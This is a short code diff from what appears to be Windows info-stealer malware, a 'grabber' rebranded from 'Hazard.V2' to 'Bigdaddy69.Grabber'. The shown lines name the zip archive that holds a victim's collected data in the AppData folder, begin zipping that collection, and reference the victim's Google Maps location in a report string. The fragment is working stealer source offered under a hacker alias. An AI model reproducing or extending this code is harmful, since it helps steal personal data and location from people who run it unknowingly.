@@ -804,7 +804,7 @@ GoogleMaps: {self.googlemap}
                                 + "\n\n🌟・Grabber By Bigdaddy69・Bigdaddy69#6969"
                             )
 
-        _zipfile = ntpath.join(self.appdata, f"Hazard.V2-[{Victim}].zip")
+        _zipfile = ntpath.join(self.appdata, f"Bigdaddy69.Grabber-[{Victim}].zip")
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
